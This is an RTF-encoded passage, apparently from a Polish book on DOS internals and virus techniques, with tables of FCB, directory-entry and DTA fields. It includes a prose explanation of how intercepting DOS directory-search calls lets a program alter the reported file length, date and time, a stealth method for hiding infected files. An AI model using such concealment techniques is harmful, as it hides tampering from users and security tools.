\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 00 - SHARE.EXE nieza\uc1\u322\'b3adowany, plik dyskowy }{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 01             - SHARE.EXE nieza\uc1\u322\'b3adowany, sterownik}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 10             - SHARE.EXE za\uc1\u322\'b3adowany, plik zdalny}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 11             - SHARE.EXE za\uc1\u322\'b3adowany, plik dyskowy}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                    lub sterownik bity 5-0 mniej znacz\uc1\u261\'b9ce 6 bit\'f3w ze s\uc1\u322\'b3owa atrybut\'f3w}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:11; bot-attach:12; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx977\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}1A-1F}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:11; bot-attach:12; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}zawarto\uc1\u347\'9c\uc1\u263\'e6 zale\uc1\u380\'bfna od pola 19, bity 7-6 }{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch warto\uc1\u347\'9c\uc1\u263\'e6 11}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch    1A-1B         numer pierwszej JAP pliku }{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch    1C-1D         o}{\f0\fs24\lang1045{\*\listtag0}kre\uc1\u347\'9cla numer rekordu w dost\uc1\u281\'eapie dzielonym }{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch    1E              atrybuty pliku }{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch    1F              nie u\uc1\u380\'bfywane warto\uc1\u347\'9c\uc1\u263\'e6 }{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 10}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch    1A-1B         uchwyt w sieci }{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch    1C-1F         ID w sieci warto\uc1\u347\'9c\uc1\u263\'e6 }{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 01}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch    1A-1D         wska\uc1\u378\'9fnik do nagf\'f3wka sterownika }{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch    1E-1F    }{\f0\fs24\lang1045{\*\listtag0}     nie u\uc1\u380\'bfywane }{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch warto\uc1\u347\'9c\uc1\u263\'e6 00 }{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch    1A              bajt informacyjny        }{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch    bit 7:      atrybut tytko do odczytu w SFT        }{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch    bit 6:      atrybut archiwalno\uc1\u347\'9cci w SFT        }{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch    bity 5-0:  wy\uc1\u380\'bfsze bity numeru sektora }{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch    1B-1C         numer pierwszej JAP pliku }{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch    1D-1F         ni\uc1\u380\'bfsze bity sektora zawieraj\uc1\u261\'b9cego adres w katalogu }{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch    1F              ilo\uc1\u347\'9c\uc1\u263\'e6 pozycji katalogu w sektorze}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:12; bot-attach:13; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx977\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}20}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:12; bot-attach:13; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}bie\uc1\u380\'bf\uc1\u261\'b9cy rekord }\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:13; bot-attach:14; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx977\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}21-24}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:13; bot-attach:14; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}numer rekordu w dost\uc1\u281\'eapie swobodnym; je\uc1\u380\'bfeli rozmiar rekordu 64 bajt\'f3w, bardziej znacz\uc1\u261\'b9ca cz\uc1\u281\'ea\uc1\u347\'9c\uc1\u263\'e6 jest pomijana}\cell{\*\abiendcell}\row}{\*\abiendtable}\par
\pard\plain\ltrpar\ql\itap0{\f3\fs20\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            }{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch Struktura bloku opisu pliku FCB (rozszerzonego)}{\*\abitableprops table-col-spacing:0.02in; table-column-leftpos:-0.0486in; table-column-props:0.7175in/5.8710in/; table-sdh:894ac30}\par{\*\abicellprops left-attach:0; right-attach:1; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}{
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx977\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Adres}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Zawarto\uc1\u347\'9c\uc1\u263\'e6}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx977\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}00}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}warto\uc1\u347\'9c\uc1\u263\'e6 OFFh oznacza blok rozszerzony }\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:2; bot-attach:3; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx977\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}01-05}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:2; bot-attach:3; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}zarezerwowane}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:3; bot-attach:4; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx977\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}06}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:3; bot-attach:4; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}atrybuty pliku }\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:4; bot-attach:5; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx977\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}07-2B}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:4; bot-attach:5; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}zwyk\uc1\u322\'b3}{\f1\fs24\lang1045{\*\listtag0}y blok opisu FCB (patrz poprzednia tabela)}\cell{\*\abiendcell}\row}{\*\abiendtable}\par
\pard\plain\ltrpar\ql\itap0{\f3\fs20\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch Struktura pola opisu pozycji katalogu}{\*\abitableprops table-col-spacing:0.02in; table-column-leftpos:-0.0486in; table-column-props:0.7175in/5.8710in/; table-sdh:8993970}\par{\*\abicellprops left-attach:0; right-attach:1; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}{
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx977\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Adres}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Zawarto\uc1\u347\'9c\uc1\u263\'e6}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx977\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}00-07}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}nazwa pliku}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:2; bot-attach:3; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx977\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}08-0A}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:2; bot-attach:3; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}rozszerzenie pliku}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:3; bot-attach:4; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx977\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}0B}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:3; bot-attach:4; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}atrybuty pliku }\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:4; bot-attach:5; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx977\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}0C-15}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:4; bot-attach:5; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}zarezerwowane}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:5; bot-attach:6; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx977\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}16-17}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:5; bot-attach:6; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}czas ostatniej modyfikacji pliku }\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:6; bot-attach:7; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx977\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}18-19}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:6; bot-attach:7; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}data ostatniej modyfikacji pliku }\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:7; bot-attach:8; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx977\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}1A-1B}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:7; bot-attach:8; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}numer pierwszej JAP }\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:8; bot-attach:9; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx977\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}1C-1F}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:8; bot-attach:9; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}d\uc1\u322\'b3ugo\uc1\u347\'9c\uc1\u263\'e6 pliku}\cell{\*\abiendcell}\row}{\*\abiendtable}\par
\pard\plain\ltrpar\ql\itap0{\f3\fs20\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch 7.1.1.2. Programy nak\uc1\u322\'b3adkowe u\uc1\u380\'bfywaj\uc1\u261\'b9ce kr\'f3tkich nazw program\'f3w (DOS, Windows 3.1)}{\f0\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Nak\uc1\u322\'b3adki operuj\uc1\u261\'b9ce na kr\'f3tkich nazwach plik\'f3w (tzn. 8 znak\'f3w nazwy i 3 znaki rozszerzenia) u\uc1\u380\'bfywaj\uc1\u261\'b9 do przegl\uc1\u261\'b9dania katalogu funkcji (4E, 4F/21). Wynik wywo\uc1\u322\'b3ania tych funkcji zwracany jest w buforze DTA, jednak format opisu znalezionej pozycji katalogu jest inny ni\uc1\u380\'bf podczas wywo\uc1\u322\'b3ywania funkcji (11,12/21). Nie zmienia si\uc1\u281\'ea natomiast sam spos\'f3b oszukiwania systemu. }{\f1\fs24\lang1045{\*\listtag0}P}{\f0\fs24\lang1045{\*\listtag0}o wykryciu wywo\uc1\u322\'b3ywania kt\'f3rej\uc1\u347\'9c z funkcji, nale\uc1\u380\'bfy najpierw uruchomi\uc1\u263\'e6 j\uc1\u261\'b9 za pomoc\uc1\u261\'b9 pierwotnego programu obs\uc1\u322\'b3ugi, a nast\uc1\u281\'eapnie odczyta\uc1\u263\'e6 adres bufora DTA i zmodyfikowa\uc1\u263\'e6 odpowiednie pola struktury.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Pola struktury DTA pokazano poni\uc1\u380\'bfej. Najwa\uc1\u380\'bfniejsze z nich to: d\uc1\u322\'b3ugo\uc1\u347\'9c\uc1\u263\'e6 pliku (adres 1A-1D) oraz czas i data (adresy 16-17 i 18-19).}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch Struktura DTA}{\*\abitableprops table-col-spacing:0.02in; table-column-leftpos:-0.0486in; table-column-props:0.7175in/5.8710in/; table-sdh:89976b0}\par{\*\abicellprops left-attach:0; right-attach:1; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}{
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx977\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Adres}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Zawarto\uc1\u347\'9c\uc1\u263\'e6}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx977\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}00}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}znaczenie bit\'f3w:}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch    bity 6-0 numer nap\uc1\u281\'eadu         }{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch    bit 7  ustawiony, oznacza plik zdalny}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:2; bot-attach:3; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx977\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}01-0B}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:2; bot-attach:3; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}szablon poszukiwanych pozycji katalogu }\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:3; bot-attach:4; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx977\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}0C}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:3; bot-attach:4; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}atrybuty poszukiwanej pozycji }\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:4; bot-attach:5; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx977\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}0D-0E}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:4; bot-attach:5; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}numer wej\uc1\u347\'9ccia w katalogu}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:5; bot-attach:6; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx977\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}0F-10}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:5; bot-attach:6; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}numer JAP katalogu nadrz\uc1\u281\'eadnego}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:6; bot-attach:7; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx977\clvertalt\cltxlrtb    \cellx9431
